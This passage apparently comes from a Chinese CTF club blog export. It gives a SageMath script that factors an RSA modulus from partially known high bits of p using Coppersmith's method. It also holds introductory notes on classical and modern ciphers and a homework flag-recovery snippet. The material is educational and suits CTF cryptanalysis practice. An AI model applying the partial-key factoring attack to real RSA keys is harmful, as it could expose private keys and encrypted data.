<p><a href="https://security.feishu.cn/link/safety?target=https://blog.csdn.net/qq_42667481/article/details/117883231&amp;scene=ccm&amp;logParams=%7B%22location%22:%22ccm_drive%22%7D&amp;lang=zh-CN">格基规约算法：数学基础_随缘懂点密码学的博客-CSDN博客_格基约化算法</a></p>
<p><a href="https://security.feishu.cn/link/safety?target=https://blog.csdn.net/qq_42667481/article/details/118332181&amp;scene=ccm&amp;logParams=%7B%22location%22:%22ccm_drive%22%7D&amp;lang=zh-CN">格基规约算法：算法详解_随缘懂点密码学的博客-CSDN博客_格基规约</a></p>
<p>[LLL算法在RSA安全分析中的应用][LLL算法在RSA安全性分析中的应用_知网百科 (cnki.net)](https://security.feishu.cn/link/safety?target=https://xuewen.cnki.net/ArticleCatalog.aspx?filename=1013353564.nh&amp;dbtype=CMFD&amp;dbname=CMFD201401&amp;scene=ccm&amp;logParams={"location":"ccm_drive"}&amp;lang=zh-CN)</p>
<p>p为1024位时，需最高知道p的高位的576位，位数不够时需爆破。 <span class="math display">\[ 在这个问题中，我们的目标是找到模N意义下多项式f所有的根，通过LLL算法，我们能找到\ 与该多项式具有相同的根x_0,\ 更小系数，\ 定义在整数域，\ 上的多项式g。从而我们就得到了原多项式在模意义下的整数根. \]</span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">n = 25348605574630284342864323710011622959543974652863854537355760576386763162531478272446867731299572532294812374775121121761898206639041068156270466457595336452690367719842145233764550634280981441631262047763246059814963741143303914063537003244814908763379320576260885158458898112416692583017869283284022878603506583499699525249773663841642694427307104140944360804367072787670581252816486834658346431010523135392357008103555699542414687172408709153334263858639251735462278292703380745537045458408951791720967957274781161667526873251066303708008043058246747534357368350540174588670636827470901518225473676343782182718627</span><br><span class="line">p4 =0x3e67e7cacd2584224fb2026b40afbcc4281bd59f72f7801239d95c61c48ded7649924f794592fce806e032f16c2f4a90466905fc30037317074a6424d8bf078e959a1ed2d8e5c000 </span><br><span class="line">e = 0x10001</span><br><span class="line">pbits = 1024</span><br><span class="line">for i in range(0,4096):</span><br><span class="line">    p4=0x3e67e7cacd2584224fb2026b40afbcc4281bd59f72f7801239d95c61c48ded7649924f794592fce806e032f16c2f4a90466905fc30037317074a6424d8bf078e959a1ed2d8e5c000</span><br><span class="line">    p4=p4+int(hex(i),16)</span><br><span class="line">    kbits = pbits - p4.nbits()</span><br><span class="line">    p4 = p4 &lt;&lt; kbits</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = x + p4</span><br><span class="line">    roots = f.small_roots(X=2^kbits, beta=0.4)</span><br><span class="line">    if roots:</span><br><span class="line">        p = p4+int(roots[0])</span><br><span class="line">        print( &quot;n: &quot;, n)</span><br><span class="line">        print(&quot;p: &quot;, p)</span><br><span class="line">        print (&quot;q: &quot;, n//p)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>第三次例会-密码学入门</title>
    <url>/2022/10/11/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BE%8B%E4%BC%9A-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="密码学入门">密码学入门</h1>
<h2 id="古典密码">古典密码</h2>
<h3 id="凯撒">凯撒</h3>
<p>替换加密算法，26个字母在表上循环，向前或向后移n个字母。加密后移，解密前移。<a href="https://ctf.bugku.com/tool/caesar">凯撒</a></p>
<h3 id="变异凯撒">变异凯撒</h3>
<p>替换加密算法，循环顺序变为在ascii码表上循环。</p>
<span id="more"></span>
<h3 id="维吉尼亚加密">维吉尼亚加密</h3>
<p>有字母表作为对照<img src="https://s2.loli.net/2022/10/11/FUEakgDSHZbK713.png"></p>
<p>假设明文是ATTACK，密钥是CAT，加密将密钥重复至与明文相同长度，CATCAT，一一对应查表加密。密文则是CTMCCD。</p>
<h3 id="词频分析">词频分析</h3>
<p>一段文章里，特定的字母出现的频率基本固定不变。比如字母e出现的频率最高，为0.12702，就可以分析密文的字母频率还原明文。</p>
<p>或者知道替换字母，比如MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}，<a href="https://quipqiup.com/">quipqiup</a></p>
<h2 id="现代密码">现代密码</h2>
<p>现代密码与古典密码的区别就是加密算法是否公开的区别。</p>
<h3 id="理论安全与实际安全">理论安全与实际安全</h3>
<p>理论安全，或无条件安全：攻击者无论截获多少密文，都无法得到足够的信息来唯一地决定明文。Shannon用理论证明：欲达理论安全，加密密钥长度必须大于等于明文长度，密钥只用一次，用完即丢，即一次一密。</p>
<p>实际安全，或计算上安全：如果攻击者拥有无限资源，任何密码系统都是可以被破译的；但是，在有限的资源范围内，攻击者都不能通过系统的分析方法来破解系统，则称这个系统是计算上安全的或破译这个系统是计算上不可行。</p>
<h3 id="分组密码des">分组密码：DES</h3>
<p>明文加密16轮，初始的密钥经过16轮变换产生16个子密钥用来加密每一轮产生的密文。</p>
<p><img src="https://s2.loli.net/2022/10/11/tbLr3FDqVIGemK8.png"></p>
<p>密钥转换与左旋位数有转换表作为对照。</p>
<p>加解密过程</p>
<p><img src="https://s2.loli.net/2022/10/11/Pb3cYmQ8WivVN1S.png"></p>
<p>DES已经被证明是不安全的，密钥可以通过穷举找出。现在一般采用3DES或者AES。</p>
<h3 id="分组密码的工作模式">分组密码的工作模式</h3>
<h4 id="电子密码本模式ecb">电子密码本模式，ECB</h4>
<p><img src="https://s2.loli.net/2022/10/11/rqBjypQkZUKcIlR.png"></p>
<p>ECB模式特别适合数据较少的情况，如安全传输密钥。一段明文消息中若有几个相同的明文组，则密文也将出现几个相同的片段。对于很长的消息，ECB是不安全的，如果消息是非常结构化的，密码分析可能利用其结构特征来破解。</p>
<h4 id="密文分组链接模式-cbc">密文分组链接模式 CBC</h4>
<p><img src="https://s2.loli.net/2022/10/11/uUBEFt2SGnIyfzw.png"></p>
<p>加密输入是当前明文分组和前一密文分组的异或</p>
<h4 id="密码反馈模式-cfb">密码反馈模式 CFB</h4>
<p><img src="https://s2.loli.net/2022/10/11/hZmBrlfAvgQ5Vqk.png"></p>
<p>先加密初始向量再异或，异或结果作为下一轮密钥</p>
<h4 id="输出反馈模式-ofb">输出反馈模式 OFB</h4>
<p><img src="https://s2.loli.net/2022/10/11/mwD7iq9PhcO84Kz.png"></p>
<p>加密结果作为下一轮密钥</p>
<h3 id="公钥密码rsa">公钥密码：RSA</h3>
<p>RSA是ctf比赛中最常见的加密算法，有多种多样的攻击方式。</p>
<h4 id="加解密算法">加解密算法</h4>
<p><span class="math display">\[
费马小定理：若p是素数，a是正整数且不能被p整除，则a^{p-1}modp \equiv  1，那么a^{p}modp \equiv a\\
欧拉函数：\phi(n)的值是从1到n-1和n互质的数的数量。\\
显然，对于质数n \phi(n)=n-1，如果n为两个质数p和q的乘积，\phi(n)=(p-1)*(q-1).\\
欧拉定理：对于任意互质的a和n有：a^{\phi(n)}\equiv1modn.\\
RSA加密算法：随机选择两个大素数p和q，计算n=p*q以及phi=(p-1)*(q-1).\\
选择一个与\phi(n)互质的数e作为加密指数，对e求关于phi的逆作为d，即ed\equiv1mod\phi(n).\\
加密：c=m^emodn\\
解密：m=c^dmodn=(m^emodn)^dmodn=m.
\]</span></p>
<h3 id="公钥密码elgamal">公钥密码：Elgamal</h3>
<p>假设A和B互相通信，共享大素数p，本原元素<span class="math inline">\(\alpha\)</span>，明文m&lt;p，通信时A的私钥为<span class="math inline">\(x_a\)</span>，公钥为<span class="math inline">\(Y_a=\alpha^{x_a}modp\)</span>，B的私钥为<span class="math inline">\(x_b\)</span>，公钥为<span class="math inline">\(Y_b=\alpha^{x_b}modp\)</span>，A向B发送消息，计算K=<span class="math inline">\(Y_b^{x_a}modp\)</span>=<span class="math inline">\(\alpha^{x_ax_b}modp\)</span>，<span class="math inline">\(c_1=\alpha^{x_a}modp，c_2=mKmodp\)</span>，密文即为(<span class="math inline">\(c_1，c_2\)</span>)。</p>
<p>B收到信息后，首先恢复K，K=<span class="math inline">\(c_1^{x_b}modp\)</span>，然后m=<span class="math inline">\(c_2/Kmodp\)</span>.</p>
<p>每次随机选择私钥发送信息，同样的密文每次加密出不同的密文。</p>
<h3 id="公钥密码ecc">公钥密码：ECC</h3>
<p>最简单的一类椭圆曲线：<span class="math inline">\(y^2=x^3+ax+b\)</span>.</p>
<figure>
<img src="https://s2.loli.net/2022/10/11/HTgMhofD4AtijC1.png" alt="image.png"><figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>加法与乘法的定义：连线与切线。</p>
<p>加密时，A选取一条椭圆曲线<span class="math inline">\(E_p(a,b)\)</span>并选择其中一点G，选取私钥k计算kG作为公钥。</p>
<p>A将E，K，G发送给B。</p>
<p>B将明文m转换为E上的一个点M，并生成一个随机数r，计算<span class="math inline">\(c_1=M+rK，c_2=rG\)</span>，发送<span class="math inline">\(c_1,c_2\)</span></p>
<p>A计算<span class="math inline">\(c_1-kc_2\)</span>即可解密。</p>
<h3 id="格密码">格密码</h3>
<p>涉及线代知识，目前阶段不作为重点。</p>
<h2 id="作业">作业</h2>
<ol type="1">
<li><div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>   <span class="co"># flag * 2 ** 10000 mod 10**175 = x</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>   <span class="co"># flag * 2 ** 10000 = y * 2 ** 175 + k * 10 ** 175</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>   <span class="co"># flag * 2 ** 9825 = y mod 5 ** 175</span></span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>   <span class="bu">print</span>(gmpy2.invert(<span class="dv">2</span> <span class="op">**</span> <span class="dv">9825</span>, <span class="dv">5</span> <span class="op">**</span> <span class="dv">175</span>))</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>   y <span class="op">=</span> <span class="dv">1473327817893791860679080635376845598464916175771199125558742418628097409377550464912703622357336416382120404612476355317875179245511879304348013049276070451780858374753615872</span> <span class="op">//</span> (<span class="dv">2</span> <span class="op">**</span> <span class="dv">175</span>)</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>   <span class="bu">print</span>(y)</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>   flag <span class="op">=</span> y <span class="op">*</span> gmpy2.invert(<span class="dv">2</span> <span class="op">**</span> <span class="dv">9825</span>, <span class="dv">5</span> <span class="op">**</span> <span class="dv">175</span>) <span class="op">%</span> (<span class="dv">5</span> <span class="op">**</span> <span class="dv">175</span>)</span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>   <span class="bu">print</span>(long_to_bytes(flag))</span></code></pre></div></li>
</ol>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
  </entry>
</search>
